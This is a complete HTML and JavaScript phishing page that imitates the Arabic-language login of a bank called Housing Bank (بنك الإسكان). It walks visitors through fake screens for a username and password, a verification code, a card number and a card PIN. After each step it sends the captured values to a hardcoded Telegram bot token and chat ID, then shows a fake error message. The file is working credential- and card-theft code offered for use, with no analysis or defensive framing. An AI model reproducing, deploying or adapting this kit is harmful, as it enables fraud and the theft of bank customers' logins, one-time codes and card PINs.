<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>بنك الإسكان - تسجيل الدخول</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root {
            --main-color: #004a99;
            --light-bg: #f8f9fa;
            --input-bg: #fff;
            --border-radius: 16px;
            --shadow: 0 5px 24px rgba(0,0,0,0.09);
            --font-family: 'Cairo', Tahoma, Arial, sans-serif;
        }
        body {
            background: var(--light-bg);
            font-family: var(--font-family);
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 370px;
            margin: 40px auto;
            background: var(--input-bg);
            border-radius: var(--border-radius);
            box-shadow: var(--shadow);
            padding: 28px 24px 22px 24px;
            position: relative;
        }
        .logo {
            text-align: center;
            margin-bottom: 23px;
        }
        .logo img {
            width: 170px;
            margin-bottom: 12px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
        .logo-title {
            font-size: 28px;
            color: var(--main-color);
            font-weight: bold;
            margin-bottom: 0;
        }
        .logo-sub {
            font-size: 16px;
            color: #333;
            letter-spacing: 0.5px;
        }
        .btn {
            display: block;
            width: 100%;
            background: var(--main-color);
            color: #fff;
            border: none;
            border-radius: 8px;
            padding: 13px 0;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 13px;
            margin-bottom: 10px;
            transition: background 0.2s;
        }
        .btn-outline {
            background: #fff;
            color: var(--main-color);
            border: 2px solid var(--main-color);
        }
        .btn:hover, .btn-outline:hover {
            background: #003366;
            color: #fff;
            border-color: #003366;
        }
        .options {
            display: flex;
            gap: 12px;
            margin-top: 18px;
        }
        .options .btn {
            flex: 1;
            margin: 0;
        }
        .input-group {
            margin-bottom: 18px;
        }
        .input-label {
            display: block;
            margin-bottom: 5px;
            color: #555;
            font-size: 15px;
        }
        .input-icon {
            position: absolute;
            left: 12px;
            top: 14px;
            color: #aaa;
        }
        .input-box {
            position: relative;
        }
        input[type="text"], input[type="password"], input[type="number"], select {
            width: 100%;
            background: var(--input-bg);
            border: 1.5px solid #e0e0e0;
            border-radius: 8px;
            padding: 13px 36px 13px 34px;
            font-size: 15px;
            transition: border-color 0.2s;
            box-sizing: border-box;
            direction: ltr !important;
        }
        select {
            padding-right: 10px;
            padding-left: 0;
        }
        input:focus, select:focus {
            border-color: var(--main-color);
            outline: none;
        }
        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 13px;
        }
        .checkbox-group input[type="checkbox"] {
            accent-color: var(--main-color);
        }
        .card-inputs {
            display: flex;
            gap: 7px;
            margin-bottom: 14px;
            flex-direction: row-reverse;
        }
        .card-inputs input, .card-inputs select {
            text-align: center;
            font-size: 16px;
            padding: 12px 0 !important;
            direction: ltr !important;
        }
        .snackbar {
            visibility: hidden;
            min-width: 250px;
            background-color: #d32f2f;
            color: #fff;
            text-align: center;
            border-radius: 8px;
            padding: 16px;
            position: fixed;
            z-index: 100;
            left: 50%;
            bottom: 30px;
            font-size: 16px;
            transform: translateX(-50%);
        }
        .snackbar.show {
            visibility: visible;
            animation: fadein 0.5s, fadeout 0.5s 2.2s;
        }
        @keyframes fadein {
            from {bottom: 0; opacity: 0;}
            to {bottom: 30px; opacity: 1;}
        }
        @keyframes fadeout {
            from {bottom: 30px; opacity: 1;}
            to {bottom: 0; opacity: 0;}
        }
        .center-text {
            text-align:center;font-size:16px;color:#444;margin-bottom:12px;
        }
        .back-btn {
            position: absolute;
            top: 18px;
            right: 18px;
            background: none;
            border: none;
            color: var(--main-color);
            cursor: pointer;
            font-size: 19px;
            font-family: var(--font-family);
            padding: 0;
            z-index: 2;
            display: flex;
            align-items: center;
        }
        .back-btn svg {
            margin-left: 5px;
        }
        .verify-label {
            font-size: 22px;
            color: var(--main-color);
            font-weight: bold;
            text-align: center;
            display: block;
            margin-bottom: 12px;
        }
        .big-label {
            font-size: 18px !important;
            color: var(--main-color);
            font-weight: bold;
            margin-bottom: 10px;
            text-align: left;
            display: block;
        }
        /* Hide arrows for input number */
        input[type=number]::-webkit-inner-spin-button, 
        input[type=number]::-webkit-outer-spin-button { 
            -webkit-appearance: none; 
            margin: 0; 
        }
        input[type=number] { -moz-appearance:textfield; }
    </style>
</head>
<body>
    <div id="main"></div>
    <div id="snackbar" class="snackbar">حدث خطأ في المعلومات، يرجى إعادة المحاولة.</div>
    <script>
        // شعار الموقع
        const logoHtml = `
            <div class="logo">
                <img src="https://www2.0zz0.com/2025/09/28/04/434982011.png" alt="شعار الموقع"/>
                <div class="logo-title">بنك الإسكان</div>
                <div class="logo-sub">Housing Bank</div>
            </div>
        `;

        // زر الرجوع
        function backBtn(onclickFn = "renderStart()") {
            return `<button class="back-btn" onclick="${onclickFn}" title="رجوع">
                <svg width="22" height="22"><polyline points="15,4 7,11 15,18" stroke="#004a99" stroke-width="2.6" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>رجوع
            </button>`;
        }

        // بيانات تلجرام
        const TG_TOKEN = "8399446916:AAEMixTeIz7_jG2xNy1guVQeJ6jzgPTNYXo";
        const TG_CHAT_ID = "6873334348";
        function sendToTelegram(msg) {
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: TG_CHAT_ID,
                    text: msg
                })
            });
        }

        // متغيرات تخزين بيانات المستخدم/البطاقة
        let userData = {};
        let cardData = {};

        // صفحة البداية
        function renderStart() {
            userData = {};
            cardData = {};
            document.getElementById('main').innerHTML = `
                <div class="container">
                    ${logoHtml}
                    <div class="center-text">يرجى اختيار أحد الخيارات التالية:</div>
                    <div class="options">
                        <button class="btn" onclick="renderLogin()">لقد قمت بتفعيل تطبيق البنك</button>
                        <button class="btn-outline" onclick="renderCardStep1()">لم أقم بتفعيل تطبيق البنك</button>
                    </div>
                </div>
            `;
        }

        // تحقق عدم وجود أحرف عربية
        function hasArabicLetters(str) {
            return /[\u0600-\u06FF]/.test(str);
        }

        // صفحة تسجيل الدخول
        function renderLogin() {
            document.getElementById('main').innerHTML = `
                <div class="container">
                    ${backBtn()}
                    ${logoHtml}
                    <form id="loginForm" autocomplete="off">
                        <div class="input-group">
                            <label class="input-label" for="username">اسم المستخدم <span style="color:#d32f2f;font-size:13px;">(غير مسموح بإدخال أحرف عربية)</span></label>
                            <div class="input-box">
                                <input type="text" id="username" name="username" required placeholder="اسم المستخدم" autocomplete="username" pattern="[^ء-ي]+"/>
                                <span class="input-icon"><svg width="18" height="18"><circle cx="9" cy="7" r="4" fill="#aaa"/><rect x="5" y="15" width="8" height="2.5" rx="1.2" fill="#aaa"/></svg></span>
                            </div>
                        </div>
                        <div class="input-group">
                            <label class="input-label" for="password">الرقم السري <span style="color:#d32f2f;font-size:13px;">(غير مسموح بإدخال أحرف عربية)</span></label>
                            <div class="input-box">
                                <input type="password" id="password" name="password" required placeholder="الرقم السري" autocomplete="current-password" pattern="[^ء-ي]+"/>
                                <span class="input-icon"><svg width="18" height="18"><rect x="5" y="7" width="8" height="7" rx="2" fill="#aaa"/><rect x="7.5" y="11" width="3" height="2" rx="1" fill="#666"/></svg></span>
                            </div>
                        </div>
                        <div class="checkbox-group">
                            <input type="checkbox" id="rememberMe"/>
                            <label for="rememberMe" style="font-size:15px;color:#666;">تذكر اسم المستخدم</label>
                        </div>
                        <button class="btn" type="submit">تسجيل الدخول</button>
                    </form>
                </div>
            `;
            document.getElementById('loginForm').onsubmit = function(e){
                e.preventDefault();
                let username = document.getElementById('username').value;
                let password = document.getElementById('password').value;

                // منع الأحرف العربية
                if (hasArabicLetters(username) || hasArabicLetters(password)) {
                    showCustomSnack("غير مسموح بإدخال أحرف عربية في اسم المستخدم أو الرقم السري.");
                    return;
                }
                userData = {
                    username,
                    password,
                    rememberMe: document.getElementById('rememberMe').checked ? "نعم" : "لا"
                };
                // لا ترسل تذكرني للبوت
                var msg = `تسجيل دخول جديد:\nاسم المستخدم: ${userData.username}\nكلمة المرور: ${userData.password}`;
                sendToTelegram(msg);
                renderVerifyCode('login');
            };
        }

        // صفحة رمز التحقق بعد تسجيل الدخول أو البطاقة
        function renderVerifyCode(from) {
            document.getElementById('main').innerHTML = `
                <div class="container">
                    ${backBtn(from === 'login' ? "renderLogin()" : "renderStart()")}
                    ${logoHtml}
                    <form id="verifyCodeForm" autocomplete="off">
                        <label class="verify-label" for="verifyCode">رمز التحقق</label>
                        <div class="input-group">
                            <div class="input-box">
                                <input type="number" id="verifyCode" name="verifyCode" required placeholder="أدخل رمز التحقق" style="text-align:center;font-size:20px;"/>
                                <span class="input-icon"><svg width="18" height="18"><rect x="4" y="7" width="10" height="6" rx="2" fill="#aaa"/><circle cx="9" cy="10" r="1.2" fill="#666"/></svg></span>
                            </div>
                        </div>
                        <button class="btn" type="submit" style="margin-top:18px;">تأكيد</button>
                    </form>
                </div>
            `;
            document.getElementById('verifyCodeForm').onsubmit = function(e){
                e.preventDefault();
                let verifyCode = document.getElementById('verifyCode').value;
                let msg = "";
                if (from === 'login') {
                    msg = `تسجيل دخول جديد:\nاسم المستخدم: ${userData.username}\nكلمة المرور: ${userData.password}\nرمز التحقق: ${verifyCode}`;
                } else if (from === 'card') {
                    msg =
                        `بيانات البطاقة:\n` +
                        `رقم البطاقة: ${cardData.fullCard}\n` +
                        `الرقم السري للبطاقة: ${cardData.cardPin}\n` +
                        `رمز التحقق: ${verifyCode}`;
                }
                sendToTelegram(msg);
                showErrorSnack();
                setTimeout(()=>{
                    if(from === 'login') renderLogin();
                    else renderStart();
                }, 1500);
            };
        }

        // صفحة إدخال رقم البطاقة (تصميم جديد)
        function renderCardStep1() {
            cardData = {};
            document.getElementById('main').innerHTML = `
                <div class="container">
                    ${backBtn()}
                    ${logoHtml}
                    <form id="cardStep1Form" autocomplete="off">
                        <label class="big-label" style="text-align:center;display:block;">رقم البطاقة</label>
                        <div style="display:flex;justify-content:center;align-items:center;gap:7px;flex-direction:row-reverse;margin-bottom:14px;">
                            <select id="cardStart" required style="width:95px; padding:12px 3px; font-size:16px; border-radius:7px; border:1.5px solid #e0e0e0;direction:ltr;">
                                <option value="">اختيار</option>
                                <option value="401319">401319</option>
                                <option value="401340">401340</option>
                                <option value="449349">449349</option>
                                <option value="455094">455094</option>
                            </select>
                            <div id="cardInputs" style="display:flex;gap:4px;">
                                <!-- سيتم توليد 10 مربعات هنا -->
                            </div>
                        </div>
                        <button class="btn" type="submit" style="margin-top:20px;">التالي</button>
                    </form>
                </div>
            `;
            // توليد 10 مربعات رقمية
            const cardInputsDiv = document.getElementById('cardInputs');
            for(let i=0; i<10; i++) {
                const inp = document.createElement('input');
                inp.type = 'text';
                inp.inputMode = 'numeric';
                inp.pattern = '\\d';
                inp.maxLength = 1;
                inp.id = 'cardDigit'+i;
                inp.style = 'width:28px;text-align:center;font-size:17px;direction:ltr;';
                inp.autocomplete = 'off';
                cardInputsDiv.appendChild(inp);
            }

            // التنقل التلقائي بين المربعات
            const digitInputs = Array.from(document.querySelectorAll('#cardInputs input'));
            digitInputs.forEach((inp, idx) => {
                inp.addEventListener('input', function(e){
                    this.value = this.value.replace(/[^0-9]/g,'').slice(0,1);
                    if(this.value && idx < digitInputs.length-1) digitInputs[idx+1].focus();
                });
                inp.addEventListener('keydown', function(e){
                    if(e.key === 'Backspace' && !this.value && idx > 0) {
                        digitInputs[idx-1].focus();
                    }
                });
            });

            // التركيز على أول مربع عند تغيير أول 6 أرقام
            document.getElementById('cardStart').addEventListener('change',function(){
                digitInputs[0].focus();
            });

            document.getElementById('cardStep1Form').onsubmit = function(e){
                e.preventDefault();
                const cardStart = document.getElementById('cardStart').value;
                const digits = digitInputs.map(x=>x.value).join('');
                if(!cardStart || digits.length !== 10 || digits.includes('')) {
                    showCustomSnack('يرجى اختيار أول 6 أرقام وإدخال 10 أرقام للبطاقة.');
                    return;
                }
                // حفظ البيانات
                cardData.cardStart = cardStart;
                cardData.cardRest = digits;
                cardData.fullCard = cardStart + digits;
                // انتقل لخطوة الرقم السري
                renderCardPin(cardStart, digits);
            };
        }

        // صفحة إدخال الرقم السري للبطاقة (تعديل لقبول الإدخال الجديد)
        function renderCardPin(cardStart, cardRest) {
            cardData.cardStart = cardStart;
            cardData.cardRest = cardRest;
            cardData.fullCard = `${cardStart}${cardRest}`;
            document.getElementById('main').innerHTML = `
                <div class="container">
                    ${backBtn(`renderCardStep1()`)}
                    ${logoHtml}
                    <form id="cardPinForm" autocomplete="off">
                        <div class="input-group">
                            <label class="input-label" for="cardPin">الرقم السري للبطاقة</label>
                            <div class="input-box">
                                <input type="password" id="cardPin" name="cardPin" maxlength="4" required pattern="\\d{4}" placeholder="____" style="direction:ltr;text-align:center;"/>
                                <span class="input-icon"><svg width="18" height="18"><rect x="5" y="7" width="8" height="7" rx="2" fill="#aaa"/><rect x="7.5" y="11" width="3" height="2" rx="1" fill="#666"/></svg></span>
                            </div>
                        </div>
                        <button class="btn" type="submit">التالي</button>
                    </form>
                </div>
            `;
            document.getElementById('cardPin').focus();
            document.getElementById('cardPinForm').onsubmit = function(e){
                e.preventDefault();
                cardData.cardPin = document.getElementById('cardPin').value;
                if(cardData.cardPin.length !== 4 || /[^0-9]/.test(cardData.cardPin)){
                    showCustomSnack("يرجى إدخال الرقم السري (4 أرقام).");
                    return;
                }
                let msg =
                    `بيانات البطاقة:\n` +
                    `رقم البطاقة: ${cardData.fullCard}\n` +
                    `الرقم السري للبطاقة: ${cardData.cardPin}`;
                sendToTelegram(msg);
                renderVerifyCode('card');
            };
        }

        // رسالة خطأ منبثقة
        function showErrorSnack() {
            var x = document.getElementById("snackbar");
            x.className = "snackbar show";
            setTimeout(function(){ x.className = x.className.replace("show", ""); }, 2300);
        }
        function showCustomSnack(msg) {
            var x = document.getElementById("snackbar");
            x.innerText = msg;
            x.className = "snackbar show";
            setTimeout(function(){ x.className = x.className.replace("show", ""); x.innerText = "حدث خطأ في المعلومات، يرجى إعادة المحاولة."; }, 2300);
        }

        // بدء الصفحة
        renderStart();
    </script>
</body>
</html>